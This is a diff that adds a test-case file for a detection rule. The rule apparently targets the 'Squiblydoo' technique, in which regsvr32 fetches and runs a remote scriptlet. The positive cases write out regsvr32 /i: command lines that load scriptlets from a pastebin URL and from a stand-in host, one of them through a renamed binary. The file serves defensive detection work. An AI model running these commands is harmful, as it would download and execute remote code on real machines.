@@ -1,0 +1,25 @@
+positive:
+  - name: real Squiblydoo telemetry (pastebin scriptlet)
+    event:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      CommandLine: 'regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll'
+  - name: renamed regsvr32 caught by flag pattern (real telemetry)
+    event:
+      Image: 'C:\ProgramData\jabber.exe'
+      CommandLine: 'jabber.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA .\jabber.dll'
+  - name: https scriptlet with different flag order
+    event:
+      Image: 'C:\Windows\SysWOW64\regsvr32.exe'
+      OriginalFileName: 'REGSVR32.EXE'
+      CommandLine: 'regsvr32 /n /s /i:https://example.invalid/x.sct scrobj.dll'
+negative:
+  - name: silent registration of a local COM component
+    event:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      OriginalFileName: 'REGSVR32.EXE'
+      CommandLine: 'regsvr32.exe /s "C:\Program Files\Vendor\component.dll"'
+  - name: local install argument, no URL
+    event:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      OriginalFileName: 'REGSVR32.EXE'
+      CommandLine: 'regsvr32.exe /i:C:\configs\install.ini setup.dll'
